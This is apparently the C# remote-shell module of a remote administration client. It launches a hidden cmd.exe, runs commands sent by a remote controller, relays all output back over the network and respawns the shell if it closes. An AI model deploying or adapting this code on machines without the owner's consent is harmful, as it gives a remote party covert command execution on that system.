using Client.Networking.Packets.RemoteShell;
using System.Diagnostics;
using System.Text;

namespace Client.IO
{
    using Client = Client.Networking.Client;

    public class Shell : IDisposable
    {
        private Process _prc;
        private bool _read;
        private readonly object _readLock = new object();
        private readonly object _readStreamLock = new object();
        private Encoding _encoding = Encoding.UTF8;
        private StreamWriter _inputWriter;
        private readonly Client _client;

        public Shell(Client client)
        {
            _client = client;
        }

        private void CreateSession()
        {
            lock (_readLock)
            {
                _read = true;
            }

            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = _encoding,
                    StandardErrorEncoding = _encoding,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = $"/K CHCP {_encoding.CodePage}"//đồng bộ code page của cmd với _encoding 
                }
            };
            _prc.Start();

            RedirectIO();

            _ = _client.QueuePacketAsync(new RemoteShellPacket
            {
                Output = "\n>> New Session created\n"
            });
        }

        private void RedirectIO()
        {
            _inputWriter = new StreamWriter(_prc.StandardInput.BaseStream, _encoding);
            new Thread(RedirectStandardOutput).Start();
            new Thread(RedirectStandardError).Start();
        }

        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
        {
            lock (_readStreamLock)
            {
                var streamBuffer = new StringBuilder();

                streamBuffer.Append((char)firstCharRead);

                while (streamReader.Peek() > -1)
                {
                    var ch = streamReader.Read();
                    streamBuffer.Append((char)ch);

                    if (ch == '\n')
                        SendAndFlushBuffer(ref streamBuffer, isError);
                }
                SendAndFlushBuffer(ref streamBuffer, isError);
            }
        }

        private void SendAndFlushBuffer(ref StringBuilder textBuffer, bool isError)
        {
            if (textBuffer.Length == 0) return;

            var toSend = ConvertEncoding(textBuffer.ToString());

            if (string.IsNullOrEmpty(toSend)) return;

            _ = _client.QueuePacketAsync(new RemoteShellPacket { Output = toSend, IsError = isError });

            textBuffer.Clear();
        }

        private void RedirectStandardOutput()
        {
            try
            {
                int ch;

                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardOutput.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardOutput, false);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    _ = _client.QueuePacketAsync(new RemoteShellPacket
                    {
                        Output = "\n>> Session unexpectedly closed\n",
                        IsError = true
                    });

                    CreateSession();
                }
            }
        }

        private void RedirectStandardError()
        {
            try
            {
                int ch;

                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardError.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardError, true);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    _ = _client.QueuePacketAsync(new RemoteShellPacket
                    {
                        Output = "\n>> Session unexpectedly closed\n",
                        IsError = true
                    });

                    CreateSession();
                }
            }
        }

        public bool ExecuteCommand(string command)
        {
            if (_prc == null || _prc.HasExited)
            {
                try
                {
                    CreateSession();
                }
                catch (Exception ex)
                {
                    _ = _client.QueuePacketAsync(new RemoteShellPacket
                    {
                        Output = $"\n>> Failed to creation shell session: {ex.Message}\n",
                        IsError = true
                    });
                    return false;
                }
            }

            _inputWriter.WriteLine(ConvertEncoding(command));
            _inputWriter.Flush();

            return true;
        }

        private string ConvertEncoding(string input)
        {
            var utf8Text = Encoding.Convert(_encoding, Encoding.UTF8, _encoding.GetBytes(input));
            return Encoding.UTF8.GetString(utf8Text);
        }

        public void Dispose()
        {
            lock (_readLock)
            {
                _read = false;
            }

            if (_prc == null)
                return;

            if (!_prc.HasExited)
            {
                try
                {
                    _prc.Kill();
                }
                catch
                {
                }
            }

            if (_inputWriter != null)
            {
                _inputWriter.Close();
                _inputWriter = null;
            }

            _prc.Dispose();
            _prc = null;

            GC.SuppressFinalize(this);
        }
    }
}
